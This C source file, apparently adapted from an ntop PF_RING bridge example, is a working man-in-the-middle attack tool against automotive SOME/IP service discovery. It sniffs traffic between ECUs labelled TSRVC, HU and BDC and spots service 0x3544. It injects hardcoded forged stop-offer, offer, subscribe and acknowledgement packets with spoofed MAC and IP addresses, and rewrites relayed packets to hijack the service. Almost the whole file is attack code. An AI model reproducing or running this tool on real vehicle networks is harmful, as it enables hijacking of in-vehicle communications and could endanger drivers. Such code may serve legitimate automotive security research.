/*
 * (C) 2003-23 - ntop 
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

#define _GNU_SOURCE
#include <signal.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>
#include <poll.h>
#include <sys/time.h>
#include <time.h>
#include <sys/socket.h>

#include "pfring.h"
#include "pfutils.c"

#define MAX_PKT_LEN 1536

u_int32_t num_sent = 0;

double start=0; 


/* ****************************************************** */

void printHelp(void) {
  printf("pfProtoList - Forwards traffic from -a -> -b device using vanilla PF_RING\n\n");
  printf("-h              [Print help]\n");
  printf("-v              [Verbose]\n");
  printf("-p              [Use pfring_send() instead of bridge]\n");
  printf("-a <device>     [First device name]\n");
  printf("-b <device>     [Second device name]\n");
  printf("-g <core_id>    Bind this app to a core\n");
  printf("-w <watermark>  Watermark\n");
}

/* ******************************** */

void my_sigalarm(int sig) {
  char buf[32];

  pfring_format_numbers((double)num_sent, buf, sizeof(buf), 0),
  printf("%s pps\n", buf);
  num_sent = 0;
  alarm(1);
  signal(SIGALRM, my_sigalarm);
}

/* ******************************** */

u_int pktBytes(u_char *pkt, int startIdx, int numBytes) {
  int stopIdx = startIdx + numBytes-1;
  u_int data = pkt[startIdx];
  int i;

  for (i = startIdx; i < stopIdx; ++i)
  {
      data = pkt[i+1] + (data << 8);
  }
  return(data);
}

/* check for the SomeIP service (0x3544) */
int svcAttk(u_char *rcv_pkt, u_int pkt_len) {
  u_int ubytes, ubytes1, payload_size=0, serviceID, methodID, pSize, msgType;
  u_int eSize, eType, eService, eInstance, eVersion, eTTL;
  u_int opcode, srcID, destID;
  int byte_ptr, serviceIdx, serviceID_ptr, entry_ptr;
  int txAttk = -1, tecm_offset = 0x2a, fuzzByteIdx;

  byte_ptr = 0x10;                          
  ubytes = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
  switch(ubytes)
  {
    case 0x0800:                                                    // IPV4
      /* looking for someIP-SD offered service (0x3544) */
      byte_ptr = 0x1b;
      if (rcv_pkt[byte_ptr]==0x11) {                                // UDP
        byte_ptr = 0x21;                         
        srcID = rcv_pkt[byte_ptr];                                  // src address ID
        byte_ptr += 4;                          
        destID = rcv_pkt[byte_ptr];                                 // dest address ID
        byte_ptr += 1;                          
        ubytes = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);         // src port
        byte_ptr += 2;                          
        ubytes1 = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);        // dst port
        byte_ptr += 2;                          
        payload_size = pktBytes((u_char *) rcv_pkt, byte_ptr, 2) - 8;

        if (ubytes==30490 || ubytes==30491 || ubytes==30500 || ubytes==30501 || ubytes1==30490 || ubytes1==30491 || \
          ubytes1==30500 || ubytes1==30501) {                       // port 30490, 30491, 30500 or 30501 => SOME/IP
          byte_ptr += 4;    
          serviceIdx = byte_ptr;                      
          serviceID = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
          byte_ptr += 2;                          
          methodID = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
          byte_ptr += 2;                          
          pSize = pktBytes((u_char *) rcv_pkt, byte_ptr, 4);
          byte_ptr += 10;
          msgType = rcv_pkt[byte_ptr];

          serviceID_ptr = 0;
          while (serviceID_ptr < payload_size) {
            if (serviceID==0xffff && methodID==0x8100) {              // SomeIP-SD
              byte_ptr += 6;                          
              eSize = pktBytes((u_char *) rcv_pkt, byte_ptr, 4);
              byte_ptr += 4;
              printf("SOME/IP-SD, Size: %i\n", eSize);
              entry_ptr = 0;
              while (entry_ptr < eSize) {
                eType = rcv_pkt[byte_ptr];
                byte_ptr += 4;
                eService = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
                byte_ptr += 2;
                eInstance = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
                byte_ptr += 2;
                eVersion = rcv_pkt[byte_ptr];
                byte_ptr += 1;
                eTTL = pktBytes((u_char *) rcv_pkt, byte_ptr, 3);
                printf("  eType: %i, eService: %x, eInstance: %x, eVersion: %i, eTTL: %i\n", eType, eService, eInstance, eVersion, eTTL);

                if ((eService==0x3544) && (eType==0x01)) {     
                  /* found offered service 0x3544 */
                  printf ("Received Offered service 0x3544 from TSRVC =======================================================\n");
                  txAttk = 1;
                }

                if ((destID==0x63) && (eService==0x3544) && (eType==0x06) && (eTTL!=0x0)) {
                  /* found subscribed service 0x3544 from BDC */
                  printf ("Received Subscribed service 0x3544 from BDC =======================================================\n");
                  txAttk = 2;
                }
                byte_ptr += 7;
                entry_ptr = entry_ptr + 16;
                }                    
            }
            else if (serviceID==0x3544) {
              /* Fake hijacked SomeIP service 0x3544 to BDC */
              printf ("Modified service 0x3544 from HU to BDC =======================================================\n");
              rcv_pkt[0x0] = 0xd8;                        // Dest MAC address (BDC)
              rcv_pkt[0x1] = 0x18;
              rcv_pkt[0x2] = 0x2b;
              rcv_pkt[0x3] = 0x80;
              rcv_pkt[0x4] = 0xae;
              rcv_pkt[0x5] = 0xf5;
              rcv_pkt[0x6] = 0x28;                        // Src MAC address (HU)
              rcv_pkt[0x7] = 0x56;
              rcv_pkt[0x8] = 0xc1;
              rcv_pkt[0x9] = 0xbb;
              rcv_pkt[0xa] = 0x8a;
              rcv_pkt[0xb] = 0x0d;
              rcv_pkt[0x1e] = 0xa0;                       // Src IP = 160.48.199.99
              rcv_pkt[0x1f] = 0x30;
              rcv_pkt[0x20] = 0xc7;
              rcv_pkt[0x21] = 0x63;
              rcv_pkt[0x22] = 0xa0;                       // Dest IP = 160.48.199.16
              rcv_pkt[0x23] = 0x30;
              rcv_pkt[0x24] = 0xc7;
              rcv_pkt[0x25] = 0x10;
              byte_ptr = 0x54 - tecm_offset;
              pSize = pktBytes((u_char *) rcv_pkt, byte_ptr, 2) - 2; // payload size
              byte_ptr += 2;
              txAttk = 99;
            }

            serviceID_ptr += pSize+8;
            if (serviceID_ptr<payload_size) {
                byte_ptr = serviceIdx + serviceID_ptr;
                serviceID = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
                byte_ptr += 2;                          
                methodID = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
                byte_ptr += 2;                          
                pSize = pktBytes((u_char *) rcv_pkt, byte_ptr, 4);
                byte_ptr += 10;
                msgType = rcv_pkt[byte_ptr];
            }
          }
        }
      }
      break;

    // others
    default:
      break;
  }
  return(txAttk);
}

/* ****************************************************** */

int main(int argc, char* argv[]) {
  pfring *a_ring, *b_ring, *attk_ring;
  char *a_dev = NULL, *b_dev = NULL, c;
  u_int8_t verbose = 0, use_pfring_send = 0;
  int a_ifindex, b_ifindex, attk_ifindex;
  int bind_core = -1;
  u_int16_t watermark = 1;
  char *bpfFilter = NULL;
  int firstTime=1, bufSize;
  struct timespec startClk;
  u_char fakeStopOfferFromTSRVC_BDC[] = "\xd8\x18\x2b\x80\xae\xf5\x28\x56\xc1\xbb\x8a\x0d\x81\x00\x00\x49\x08\x00\x45\x00\x00\x54\x00\xae\x00\x00\x01\x11\xea\x04\xa0\x30\xc7\x75\xa0\x30\xc7\x10\x77\x1a\x77\x1a\x00\x40\xdf\x1f\xff\xff\x81\x00\x00\x00\x00\x30\x00\x00\x00\x0a\x01\x01\x02\x00\xc0\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x10\x35\x44\x00\x01\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x09\x04\x00\xa0\x30\xc7\x75\x00\x11\x77\x25\xcf\xff\x82\x27";
  u_char fakeOfferFromHU_BDC[] = "\xd8\x18\x2b\x80\xae\xf5\x28\x56\xc1\xbb\x8a\x0d\x81\x00\x00\x49\x08\x00\x45\x00\x00\x54\x00\xae\x00\x00\x01\x11\xea\x04\xa0\x30\xc7\x63\xa0\x30\xc7\x10\x77\x1a\x77\x1a\x00\x40\xdf\x1f\xff\xff\x81\x00\x00\x00\x00\x30\x00\x00\x00\x0a\x01\x01\x02\x00\xc0\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x10\x35\x44\x00\x01\x01\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x09\x04\x00\xa0\x30\xc7\x63\x00\x11\x77\x25\xcf\xff\x82\x27";
  u_char fakeSubscribe_TSRVC[] = "\xbc\x90\x3a\xd9\xa9\x82\x28\x56\xc1\xbb\x8a\x0d\x81\x00\x00\x49\x08\x00\x45\x00\x00\x54\x00\x28\x00\x00\x01\x11\xea\x8a\xa0\x30\xc7\x63\xa0\x30\xc7\x75\x77\x1a\x77\x1a\x00\x40\xdf\x26\xff\xff\x81\x00\x00\x00\x00\x30\x00\x00\x00\x03\x01\x01\x02\x00\xc0\x00\x00\x00\x00\x00\x00\x10\x06\x00\x00\x10\x35\x44\x00\x01\x01\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x09\x04\x00\xa0\x30\xc7\x63\x00\x11\x77\x25\xaf\x08\xfc\x9e";
  u_char fakeSubscribeAck_BDC[]= "\xd8\x18\x2b\x80\xae\xf5\x28\x56\xc1\xbb\x8a\x0d\x81\x00\x00\x49\x08\x00\x45\x00\x00\x48\xe0\xec\x40\x00\x01\x11\xc9\x7e\xa0\x30\xc7\x63\xa0\x30\xc7\x10\x77\x1a\x77\x1a\x00\x34\xc0\x8e\xff\xff\x81\x00\x00\x00\x00\x24\x00\x00\x00\x09\x01\x01\x02\x00\xc0\x00\x00\x00\x00\x00\x00\x10\x07\x00\x00\x00\x35\x44\x00\x01\x01\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\x37\x1d\xe7\xff";

  while((c = getopt(argc,argv, "ha:b:c:f:vpg:w:")) != -1) {
    switch(c) {
      case 'h':
        printHelp();
        return 0;
        break;
      case 'a':
        a_dev = strdup(optarg);
        break;
      case 'b':
        b_dev = strdup(optarg);
        break;
      case 'f':
        bpfFilter = strdup(optarg);
        break;
      case 'p':
        use_pfring_send = 1;
        break;
      case 'v':
        verbose = 1;
        break;
      case 'g':
        bind_core = atoi(optarg);
        break;
      case 'w':
        watermark = atoi(optarg);
        break;
    }
  }  

  if ((!a_dev) || (!b_dev)) {
    printf("You must specify two devices!\n");
    return -1;
  }

  if(strcmp(a_dev, b_dev) == 0) {
    printf("Bridge devices must be different!\n");
    return -1;
  }

  /* Device A */
  if((a_ring = pfring_open(a_dev, MAX_PKT_LEN, 
                 PF_RING_PROMISC |
                 PF_RING_LONG_HEADER |
                 PF_RING_DISCARD_INJECTED_PKTS |
                 (use_pfring_send ? 0 : PF_RING_RX_PACKET_BOUNCE))
    ) == NULL) {
    printf("pfring_open error for %s [%s]\n", a_dev, strerror(errno));
    return(-1);
  }

  pfring_set_application_name(a_ring, "pfbridge-a");
  pfring_set_direction(a_ring, rx_only_direction);
  pfring_set_socket_mode(a_ring, recv_only_mode);
  pfring_set_poll_watermark(a_ring, watermark);
  pfring_get_bound_device_ifindex(a_ring, &a_ifindex);

  /* Adding BPF filter */
  if(bpfFilter != NULL) {
    int rc = pfring_set_bpf_filter(a_ring, bpfFilter);
    if(rc != 0)
      printf("pfring_set_bpf_filter(%s) returned %d\n", bpfFilter, rc);
    else
      printf("Successfully set BPF filter '%s'\n", bpfFilter);
  }

  /* Device B */

  if((b_ring = pfring_open(b_dev, MAX_PKT_LEN, 
                 PF_RING_PROMISC | 
                 PF_RING_LONG_HEADER)) == NULL) {
    printf("pfring_open error for %s [%s]\n", b_dev, strerror(errno));
    pfring_close(a_ring);
    return(-1);
  }

  pfring_set_application_name(b_ring, "pfbridge-b");
  pfring_set_socket_mode(b_ring, send_only_mode);
  pfring_get_bound_device_ifindex(b_ring, &b_ifindex);
  
  /* Attack ring */

  if((attk_ring = pfring_open(a_dev, MAX_PKT_LEN, 
                 PF_RING_PROMISC | 
                 PF_RING_LONG_HEADER)) == NULL) {
    printf("pfring_open error for %s [%s]\n", a_dev, strerror(errno));
    pfring_close(a_ring);
    pfring_close(b_ring);
    return(-1);
  }

  pfring_set_application_name(attk_ring, "pfSvcAttk-a");
  pfring_set_socket_mode(attk_ring, send_only_mode);
  pfring_get_bound_device_ifindex(attk_ring, &attk_ifindex);
  
  /* Enable Sockets */

  if (pfring_enable_ring(a_ring) != 0) {
    printf("Unable enabling ring 'a' :-(\n");
    pfring_close(a_ring);
    pfring_close(b_ring);
    return(-1);
  }

  if(use_pfring_send) {
    if (pfring_enable_ring(b_ring)) {
      printf("Unable enabling ring 'b' :-(\n");
      pfring_close(a_ring);
      pfring_close(b_ring);
      pfring_close(attk_ring);
      return(-1);
    }
    if (pfring_enable_ring(attk_ring)) {
      printf("Unable enabling ring 'attk' :-(\n");
      pfring_close(a_ring);
      pfring_close(b_ring);
      pfring_close(attk_ring);
      return(-1);
    }
  } else {
    pfring_close(b_ring);
  }
  
  signal(SIGALRM, my_sigalarm);
  alarm(1);

  if(bind_core >= 0)
    bind2core(bind_core);
 
  while(1) {
    u_char *buffer;
    struct pfring_pkthdr hdr;
    int attk=-1;
    
    if(pfring_recv(a_ring, &buffer, 0, &hdr, 1) > 0) {
      int rc;
      
      if(use_pfring_send) {

        if (firstTime==1) {
          clock_gettime(CLOCK_REALTIME, &startClk);
          start = startClk.tv_sec + (startClk.tv_nsec/1000000000.0);
          firstTime = 0;
        } 

        /* check for the SomeIP service (0x3544) */
        attk = svcAttk((u_char *) buffer, hdr.caplen);

        if (attk==99) {
          /* attk=99 - Relay SomeIP service 0x3544, i.e. hijacked service from TSRVC to BDC is successful */
          printf ("Attack success: Relay service 0x3544 to BDC =======================================================\n");
          rc = pfring_send(attk_ring, (char *) buffer, hdr.caplen, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);
        }
        else {
          rc = pfring_send(b_ring, (char *) buffer, hdr.caplen, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", hdr.caplen, pfring_get_mtu_size(b_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", hdr.len);
        }

        if (attk==1) {
          printf("Attack - subscribe original from TSRVC and send fake stop original 0x3544 and offer fake service 0x3544 from HU to BDC ====================================\n");

          /* fake subscribe to TSRVC */
          bufSize = sizeof(fakeSubscribe_TSRVC);
          rc = pfring_send(attk_ring, (char *) fakeSubscribe_TSRVC, bufSize, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);

          /* stop BDC subscribe to TSRVC */
          bufSize = sizeof(fakeStopOfferFromTSRVC_BDC);
          rc = pfring_send(attk_ring, (char *) fakeStopOfferFromTSRVC_BDC, bufSize, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);

          /* fake offer to BDC */
          bufSize = sizeof(fakeOfferFromHU_BDC);
          rc = pfring_send(attk_ring, (char *) fakeOfferFromHU_BDC, bufSize, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);
        }

        if (attk==2) {
          /* fake subsribe acknowledgement to BDC */
          printf("Attack - acknolwedged subscribe service 0x3544 from HU to BDC ====================================\n");
          bufSize = sizeof(fakeSubscribeAck_BDC);
          rc = pfring_send(attk_ring, (char *) fakeSubscribeAck_BDC, bufSize, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);
        }
      } 
      else {

        rc = pfring_send_last_rx_packet(a_ring, b_ifindex);
	
	      if(rc < 0)
	        printf("pfring_send_last_rx_packet() error %d\n", rc);
	      else if(verbose)
	        printf("Forwarded %d bytes packet\n", hdr.len);
      }

      if(rc >= 0) num_sent++;
	
    }
  }

  pfring_close(a_ring);
  if(use_pfring_send) pfring_close(b_ring);
  
  return(0);
}
